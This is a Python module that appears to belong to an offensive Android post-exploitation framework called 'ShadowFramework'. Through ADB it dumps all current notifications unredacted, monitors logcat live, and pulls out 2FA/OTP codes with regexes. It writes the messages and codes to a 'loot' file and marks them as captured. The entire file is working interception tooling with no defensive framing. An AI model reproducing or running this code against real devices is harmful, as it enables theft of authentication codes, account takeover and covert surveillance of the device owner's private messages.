"""
ShadowFramework — Notification Interceptor
Real-time notification capture via ADB dumpsys + logcat monitoring.
"""
import subprocess
import re
import time
import signal
import threading
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=15):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1

class Module:
    MODULE_INFO = {
        'name': 'post/android/notification_listener',
        'description': 'Intercept Android notifications in real-time via dumpsys and logcat. Captures 2FA codes, messages, alerts.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'FILTER':    'Filter by package (e.g. com.android.mms) [optional]',
            'DURATION':  'Seconds to monitor (0=until Ctrl+C) [default: 60]',
            'OUTPUT':    'Log file [default: loot/notifications.txt]',
            'MODE':      'Capture mode: DUMP, LIVE, BOTH [default: BOTH]',
        }
    }

    def __init__(self, framework):
        self.framework = framework
        self.stop_event = threading.Event()

    def _dump_current_notifications(self, dev, pkg_filter):
        """Dump all currently posted notifications."""
        console.print("[cyan][*] Dumping current notifications...[/cyan]")
        out, _, rc = _adb(dev, 'shell', 'dumpsys', 'notification', '--noredact')
        if rc != 0:
            # Try without --noredact for older Android
            out, _, rc = _adb(dev, 'shell', 'dumpsys', 'notification')

        if not out:
            console.print("[yellow][!] No notification data.[/yellow]")
            return []

        notifications = []
        current = {}
        for line in out.splitlines():
            line = line.strip()

            # Parse NotificationRecord blocks
            if 'NotificationRecord' in line or 'StatusBarNotification' in line:
                if current:
                    notifications.append(current)
                current = {'raw': line}
                pkg_match = re.search(r'pkg=(\S+)', line)
                if pkg_match:
                    current['package'] = pkg_match.group(1)
            elif 'tickerText=' in line:
                current['ticker'] = line.split('tickerText=', 1)[1]
            elif 'android.title=' in line or 'title=' in line:
                val = line.split('=', 1)[1].strip()
                if val and val != 'null':
                    current['title'] = val
            elif 'android.text=' in line or 'text=' in line:
                val = line.split('=', 1)[1].strip()
                if val and val != 'null':
                    current['text'] = val
            elif 'android.bigText=' in line:
                val = line.split('=', 1)[1].strip()
                if val and val != 'null':
                    current['bigtext'] = val
            elif 'when=' in line:
                current['when'] = line.split('when=', 1)[1].split()[0] if 'when=' in line else ''

        if current:
            notifications.append(current)

        # Filter by package if specified
        if pkg_filter:
            notifications = [n for n in notifications if pkg_filter in n.get('package', '')]

        return notifications

    def _live_monitor(self, dev, pkg_filter, duration, output_file):
        """Monitor logcat for new notifications in real-time."""
        console.print(f"[cyan][*] Live monitoring notifications (logcat)... {'Ctrl+C to stop' if duration == 0 else f'{duration}s'}[/cyan]")
        
        # Use logcat to watch for notification events
        cmd = ['adb', '-s', dev, 'logcat', '-v', 'time', 
               'NotificationService:I', 'NotificationListenerService:I',
               'StatusBar:I', 'SystemUI:I', '*:S']
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            start_time = time.time()
            captured = 0

            with open(output_file, 'a') as f:
                f.write(f"\n[=== Live Monitor Started {time.ctime()} ===]\n")
                
                while not self.stop_event.is_set():
                    if duration > 0 and (time.time() - start_time) > duration:
                        break
                    
                    line = proc.stdout.readline()
                    if not line:
                        continue
                    
                    line = line.strip()
                    # Look for notification posting events
                    if any(kw in line for kw in ['enqueueNotification', 'notify', 'postNotification', 
                                                   'onNotificationPosted', 'removeNotification']):
                        if pkg_filter and pkg_filter not in line:
                            continue

                        # Extract OTP/2FA codes from the notification content
                        otp_match = re.search(r'(?:code|OTP|verification|pin|token)[:\s]*(\d{4,8})', line, re.IGNORECASE)
                        
                        timestamp = time.strftime('%H:%M:%S')
                        if otp_match:
                            console.print(f"  [bold red]🔑 [{timestamp}] 2FA CODE CAPTURED: {otp_match.group(1)}[/bold red]")
                            console.print(f"     [dim]{line[:120]}[/dim]")
                            log_action(f"2FA code intercepted: {otp_match.group(1)}")
                        else:
                            console.print(f"  [green]📩 [{timestamp}] {line[:120]}[/green]")
                        
                        f.write(f"[{timestamp}] {line}\n")
                        f.flush()
                        captured += 1

            proc.terminate()
            proc.wait(timeout=3)
            return captured
            
        except KeyboardInterrupt:
            proc.terminate()
            return 0
        except Exception as e:
            console.print(f"[red][!] Monitor error: {e}[/red]")
            return 0

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        pkg_filter = self.framework.options.get('FILTER', '')
        duration = int(self.framework.options.get('DURATION', '60'))
        output = self.framework.options.get('OUTPUT', 'loot/notifications.txt')
        mode = self.framework.options.get('MODE', 'BOTH').upper()

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        Path(output).parent.mkdir(parents=True, exist_ok=True)
        log_action(f"Notification interceptor started on {device_id}")
        self.stop_event.clear()

        # Phase 1: Dump existing notifications
        if mode in ('DUMP', 'BOTH'):
            notifications = self._dump_current_notifications(device_id, pkg_filter)
            if notifications:
                table = Table(title=f"Current Notifications ({len(notifications)})")
                table.add_column("Package", style="cyan", max_width=30)
                table.add_column("Title", style="white", max_width=25)
                table.add_column("Content", style="green", max_width=40)

                with open(output, 'a') as f:
                    f.write(f"\n[=== Notification Dump {time.ctime()} ===]\n")
                    for n in notifications:
                        pkg = n.get('package', '?')
                        title = n.get('title', n.get('ticker', '—'))
                        text = n.get('bigtext', n.get('text', '—'))
                        table.add_row(pkg, str(title)[:25], str(text)[:40])
                        f.write(f"{pkg} | {title} | {text}\n")

                        # Auto-detect 2FA codes
                        full_text = f"{title} {text}"
                        otp = re.search(r'(?:code|OTP|verification|pin)[:\s]*(\d{4,8})', full_text, re.IGNORECASE)
                        if otp:
                            console.print(f"  [bold red]🔑 2FA CODE FOUND: {otp.group(1)} (from {pkg})[/bold red]")

                console.print(table)
            else:
                console.print("[yellow][!] No current notifications.[/yellow]")

        # Phase 2: Live monitoring
        if mode in ('LIVE', 'BOTH'):
            try:
                captured = self._live_monitor(device_id, pkg_filter, duration, output)
                console.print(f"\n[bold green][+] Captured {captured} notification events → {output}[/bold green]")
            except KeyboardInterrupt:
                console.print(f"\n[yellow][!] Monitor stopped.[/yellow]")

        console.print(f"[dim]  Full log: {output}[/dim]")
